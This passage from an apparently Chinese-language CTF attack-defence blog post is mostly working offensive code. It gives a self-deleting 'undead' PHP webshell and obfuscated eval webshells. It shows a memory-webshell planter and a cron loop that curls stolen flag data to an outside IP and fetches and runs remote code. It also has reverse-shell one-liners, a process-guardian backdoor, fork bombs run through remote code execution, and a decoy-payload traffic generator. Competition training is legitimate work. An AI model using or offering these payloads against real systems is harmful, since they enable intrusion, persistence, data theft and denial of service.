class="string">&#x27;rm ./-test.php&#x27;</span> to remove the file <span class="string">&#x27;-test.php&#x27;</span>.</span><br><span class="line">Try <span class="string">&#x27;rm --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@JD:~/test<span class="comment"># </span></span><br></pre></td></tr></table></figure><ol start="3"><li>使用不死马。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">    <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.config.php&quot;</span>, <span class="title function_ invoke__">mktime</span>(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上述代码的意思为：首先代码设置程序永久执行直到程序结束，并且客户端关闭后仍然可以执行PHP代码，可保持PHP进程一直在执行。然后删除自己后进入循环，循环生成木马文件。由于源木马已自删除，且已注入内存中执行，想让程序停止，只能是重启服务，或者找出此程序的进程然后kill。</p><p>也可使用不死马生成“-”开头的木马文件</p><h2 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h2><p>自动化攻击在CTF线下攻防赛的体现是自动化打payload获取到Flag然后自动提交的过程</p><p>批量攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Starting attack framework...&quot;</span></span><br><span class="line">    round_time = <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Round time : %s seconds...&quot;</span> % (round_time)</span><br><span class="line">    wait_time = round_time / <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Wait time : %s seconds...&quot;</span> % (wait_time)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   exploit_all()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] This round is finished , waiting for the next round...&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wait_time):</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] The next attack is %d seconds later...&quot;</span> % (wait_time - i)</span><br><span class="line">   time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host, port</span>):</span><br><span class="line">    flag = get_flag(host, port)</span><br><span class="line">    submit_flag(flag, token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_all</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;targets&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exploiting : %s:%d&quot;</span> % (host, port)</span><br><span class="line">    exploit(host, port) </span><br></pre></td></tr></table></figure><h3 id="RCE-之后"><a href="#RCE-之后" class="headerlink" title="RCE 之后"></a>RCE 之后</h3><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>webshell最好有一定的伪装性，文件名可以以 . 开头。<br>对于不同肉鸡上的webshell设置不同密码，防止别人用你的马来收flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$uf</span>=<span class="string">&quot;snc3&quot;</span>;</span><br><span class="line"><span class="variable">$ka</span>=<span class="string">&quot;IEBldmFbsK&quot;</span>;</span><br><span class="line"><span class="variable">$pjt</span>=<span class="string">&quot;CRfUE9TVF&quot;</span>;</span><br><span class="line"><span class="variable">$vbl</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;ti&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;tistittirti_rtietipltiatice&quot;</span>);</span><br><span class="line"><span class="variable">$iqw</span>=<span class="string">&quot;F6ciddKTs=&quot;</span>;</span><br><span class="line"><span class="variable">$bkf</span> = <span class="variable">$vbl</span>(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;kbakske6k4k_kdkekckokdke&quot;</span>);</span><br><span class="line"><span class="variable">$sbp</span> = <span class="variable">$vbl</span>(<span class="string">&quot;ctw&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;</span>);</span><br><span class="line"><span class="variable">$mpy</span> = <span class="variable">$sbp</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$bkf</span>(<span class="variable">$vbl</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$ka</span>.<span class="variable">$pjt</span>.<span class="variable">$uf</span>.<span class="variable">$iqw</span>))); <span class="variable">$mpy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_uU</span>=<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">114</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_uU</span>;</span><br><span class="line"><span class="variable">$_cC</span>=<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">118</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">108</span>).<span class="variable">$_uU</span>(<span class="number">40</span>).<span class="variable">$_uU</span>(<span class="number">36</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">80</span>).<span class="variable">$_uU</span>(<span class="number">79</span>).<span class="variable">$_uU</span>(<span class="number">83</span>).<span class="variable">$_uU</span>(<span class="number">84</span>).<span class="variable">$_uU</span>(<span class="number">91</span>).<span class="variable">$_uU</span>(<span class="number">49</span>).<span class="variable">$_uU</span>(<span class="number">93</span>).<span class="variable">$_uU</span>(<span class="number">41</span>).<span class="variable">$_uU</span>(<span class="number">59</span>);<span class="variable">$_fF</span>=<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">114</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">102</span>).<span class="variable">$_uU</span>(<span class="number">117</span>).<span class="variable">$_uU</span>(<span class="number">110</span>).<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">105</span>).<span class="variable">$_uU</span>(<span class="number">111</span>).</span><br><span class="line"></span><br><span class="line"><span class="variable">$_uU</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_cC</span>;</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_fF</span>(<span class="string">&quot;&quot;</span>,<span class="variable">$_cC</span>);@<span class="variable">$_</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//eval($_POST[1]) </span></span><br></pre></td></tr></table></figure><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">return</span> code_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_memery_webshell</span>(<span class="params">url, directory, password</span>):</span><br><span class="line">    sleep_time = <span class="number">500</span> <span class="comment"># micro second</span></span><br><span class="line">    code = <span class="string">&quot;&lt;?php $content = &#x27;&lt;?php eval($_REQUEST[%s]);?&gt;&#x27;; $writable_path = &#x27;%s&#x27;; $filename = &#x27;.%s.php&#x27;; $path = $writable_path.&#x27;/&#x27;.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;&quot;</span> % (password, directory, password, sleep_time)</span><br><span class="line">filename = <span class="string">&quot;.%s.php&quot;</span> % (password)</span><br><span class="line">    path = <span class="string">&quot;%s/%s&quot;</span> % (directory, filename)</span><br><span class="line">    payload = <span class="string">&quot;file_put_contents(&#x27;%s&#x27;, base64_decode(&#x27;%s&#x27;));&quot;</span> % (path, code.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_exec(url, payload).split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">active_memery_webshell</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(url, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] OK!&quot;</span> </span><br></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span>=<span class="string">&quot;* * * * * curl 192.168.136.1:8098/?flag=<span class="subst">$(cat /var/www/html/flag)</span>&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&quot;</span>;</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(0);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="variable">$x</span> =file_get_contents(<span class="string">&#x27;/var/www/html/flag&#x27;</span>);</span><br><span class="line">file_get_contents(<span class="string">&#x27;http://192.168.136.1:8099/test.php?token=kericwy&amp;flag=&#x27;</span>.<span class="variable">$x</span>);</span><br><span class="line"><span class="built_in">sleep</span>(5);</span><br><span class="line">system(<span class="string">&quot;echo &#x27;<span class="variable">$message</span>&#x27; &gt; /tmp/1 ;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;crontab /tmp/1;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;rm /tmp/1;&quot;</span>);</span><br><span class="line"><span class="variable">$c</span>=file_get_contents(<span class="string">&#x27;http://192.168.136.1:8100/1.txt&#x27;</span>);</span><br><span class="line">system(<span class="variable">$c</span>); </span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在bash下可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;127.0.0.1&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span>         </span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> </span><br></pre></td></tr></table></figure><h3 id="进程守护"><a href="#进程守护" class="headerlink" title="进程守护"></a>进程守护</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> [[ : ]]; <span class="keyword">do</span></span><br><span class="line"><span class="comment"># tell php that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Creating lock file...&quot;</span></span><br><span class="line">touch -a $&#123;bash_lock_file&#125;</span><br><span class="line"><span class="comment"># check php is living or not</span></span><br><span class="line">last_access_time=`stat -c %X $&#123;php_lock_file&#125;`</span><br><span class="line">now_time=`date +%s`</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;php last alive time : $&#123;last_access_time&#125;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ];</span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;$&#123;php_lock_file&#125;&quot;</span> ] || [ $[ <span class="variable">$now_time</span> - <span class="variable">$last_access_time</span> ] -gt $((sleep_time+<span class="number">1</span>)) ]; then</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[-] php script is dead!&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;downloading php script&quot;</span></span><br><span class="line">wget $&#123;php_url&#125; -O <span class="variable">$target_path</span> &amp;&amp; curl $&#123;start_url&#125; -m $&#123;time_out&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP script is alive...&quot;</span></span><br><span class="line">fi</span><br><span class="line"><span class="comment"># sleeping</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;sleeping...&quot;</span></span><br><span class="line">sleep $&#123;sleep_time&#125;</span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sleep_time</span> = <span class="number">3</span>; <span class="comment">// max sleep_time : 3 seconds</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$bash_url</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="comment">// tell bash that i am living</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Telling bash that i am alive...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">touch</span>(<span class="variable">$php_lock_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP Lock file last accessed : &quot;</span>.(<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$php_lock_file</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// check bash is living or not</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Checking the bash script is alive or not...\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$bash_lock_file</span>) &amp;&amp; ((<span class="title function_ invoke__">time</span>() - <span class="title function_ invoke__">fileatime</span>(<span class="variable">$bash_lock_file</span>)) &lt; (<span class="variable">$sleep_time</span> + <span class="number">1</span>))))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The bash script is dead!\n&quot;</span>;</span><br><span class="line"><span class="comment">// download bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Downloading bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$bash_path</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="comment">// restart bash script</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Restarting bash script...\n&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">popen</span>(<span class="string">&#x27;nohup bash &#x27;</span>.<span class="variable">$bash_path</span>.<span class="string">&#x27; &amp;&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// control loop speed</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sleeping...\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="variable">$sleep_time</span>);</span><br><span class="line"><span class="comment">// backdoor</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Executing backdoor...&quot;</span>;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$code_url</span>));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="fork炸弹"><a href="#fork炸弹" class="headerlink" title="fork炸弹"></a>fork炸弹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;192.168.50.57&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/code.php&quot;</span> % (host, port)</span><br><span class="line">    code = <span class="string">&quot;system(\&quot;echo &#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27; &gt; /tmp/aaa\&quot;);system(\&quot;/bin/bash /tmp/aaa\&quot;);echo \&quot;seems good!\&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span> code_exec(url, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="string">&quot;80&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://%s:%s/c.php&quot;</span> % (host, port)</span><br><span class="line">    command = <span class="string">&quot;:()&#123; :|: &amp; &#125;;:&quot;</span></span><br><span class="line">    shell_exec(url, command) </span><br></pre></td></tr></table></figure><h3 id="垃圾流量生成"><a href="#垃圾流量生成" class="headerlink" title="垃圾流量生成"></a>垃圾流量生成</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_all</span>(<span class="params">root, arg</span>):</span><br><span class="line">    <span class="built_in">all</span> = []</span><br><span class="line">    result = os.walk(root)</span><br><span class="line">    <span class="keyword">for</span> path,d,filelist <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> filelist:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&quot;.php&quot;</span>):</span><br><span class="line">               full_path = path + <span class="string">&quot;/&quot;</span> + file</span><br><span class="line">               content = get_content(full_path)</span><br><span class="line">               <span class="built_in">all</span>.append((<span class="string">&quot;/&quot;</span> + file, find_arg(content, arg)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = <span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_POST&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> get_all(root, <span class="string">&quot;_COOKIE&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_plain_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = []</span><br><span class="line">    payloads.append(<span class="string">&#x27;system(&quot;cat %s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;highlight_file(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;echo file_get_contents(&quot;%s&quot;);&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;var_dump(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    payloads.append(<span class="string">&#x27;print_r(file_get_contents(&quot;%s&quot;));&#x27;</span> % (flag_path))</span><br><span class="line">    <span class="keyword">return</span> payloads</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_fake_base64_payloads</span>(<span class="params">flag_path</span>):</span><br><span class="line">    payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="keyword">return</span> [payload.encode(<span class="string">&quot;base64&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>) <span class="keyword">for</span> payload <span class="keyword">in</span> payloads]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_path = <span class="string">&quot;/home/web/flag/flag&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="built_in">print</span> get_fake_base64_payloads(flag_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_get</span>(<span class="params">url, root, flag_path</span>):</span><br><span class="line">    all_requests = []</span><br><span class="line">    http_get = get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    plain_payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    base64_payloads = get_fake_base64_payloads(flag_path)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> http_get:</span><br><span class="line">        path = item[<span class="number">0</span>]</span><br><span class="line">          args = item[<span class="number">1</span>]</span><br><span class="line">                 <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">                    <span class="keyword">for</span> payload <span class="keyword">in</span> plain_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, new_url)</span><br><span class="line">                        all_requests.append(request)</span><br><span class="line">                          <span class="keyword">for</span> payload <span class="keyword">in</span> base64_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, 